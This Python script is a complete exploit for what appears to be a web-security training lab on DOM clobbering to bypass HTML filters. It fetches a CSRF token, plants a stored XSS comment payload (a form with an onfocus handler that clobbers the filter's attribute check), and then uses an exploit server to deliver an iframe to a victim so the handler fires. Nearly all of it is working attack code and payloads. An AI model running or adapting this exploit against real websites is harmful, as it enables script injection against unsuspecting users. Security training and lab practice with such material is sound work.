# Clobbering DOM attributes to bypass HTML filters

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
	r = s.get(url, verify=False, proxies=proxies)
	time.sleep(1)
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def send_xss(s, url):
	form_path = url + '/post?postId=6'
	csrf_token = get_csrf_token(s, form_path)
	comment_path = url + '/post/comment'
	xss_payload = """<!DOCTYPE html>
<html lang="en">
<body>
	<form id="g" tabindex="0" onfocus="print()"><input id=attributes>
</body>
</html>
"""
	comment_data = {
		"csrf": csrf_token,
		"postId": "6",
		"email": "test@attacker.com",
		"name": "gwyo",
		"website": "",
		"comment": xss_payload
	}
	print('[+] Targeted endpoint or query parameter:\n\t%s' % comment_path)
	print('[+] Using payload in comment field:\n\t%s' % xss_payload)
	r = s.post(comment_path, data=comment_data)
	return r

def deliver_payload(s, url, payload, attacker):
	post_exploit_path = attacker + '/'
	post_exploit_data = {
		"formAction": "STORE",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r1 = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(2)
	post_exploit_data = {
		"formAction": "DELIVER_TO_VICTIM",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r2 = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(1)
	print('\n[+] Targeted endpoint or query parameter:\n\t%s' % url)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\n\t%s' % post_exploit_path)
	return r2

def send_clickjacking(s, url, payload, attacker):
	post_path = url + '/post?postId=6'
	if payload == "SOLUTION":
		exploit_body = """<!DOCTYPE html>
<html lang="en">
<body>
<iframe src=""" + post_path + """ onload="setTimeout(()=>this.src+='#g',500)">
</body>
</html>"""
	else:
		exploit_body = payload
	r = deliver_payload(s, url, exploit_body, attacker)
	time.sleep(2)
	r = s.get(post_path)
	time.sleep(2)
	return r

def show_usage():
	print('[+] Usage: %s <URL> <ATTACKER> <PAYLOAD>\n' % sys.argv[0])
	print('[+] Example: %s https://www.target.com https://xxxxxxxxxx.exploit-server.net $(cat payload07.html)\n\t->\tReplace urls in the src of the iframe' % sys.argv[0])
	print('[+] Example: %s https://www.target.com https://xxxxxxxxxx.exploit-server.net SOLUTION' % sys.argv[0])
	sys.exit(-1)

def main():
	print('[+] Lab: Clobbering DOM attributes to bypass HTML filters')
	try:
		url = sys.argv[1].strip()
		attacker = sys.argv[2].strip()
		input_payload = sys.argv[3:]
		if len(input_payload) > 1:
			payload = ' '.join(input_payload).replace('> ', '>\r\n')
		else:
			payload = ''.join(input_payload)
		if payload == '':
			show_usage()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies # Comment this line to disable proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send a DOM-Based XSS in a comment...')
			r = send_xss(s, url)
			time.sleep(2)
			print('[+] Trying send a DOM-Based XSS attack to the victim...')
			r = send_clickjacking(s, url, payload, attacker)
			time.sleep(2)
			r = s.get(url, allow_redirects=False)
			time.sleep(1)
			if r.status_code == 200 and 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
			elif r.status_code == 200:
				print('[+] The Exploit sent the given payload !')
	except requests.exceptions.ProxyError:
		print('\n[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
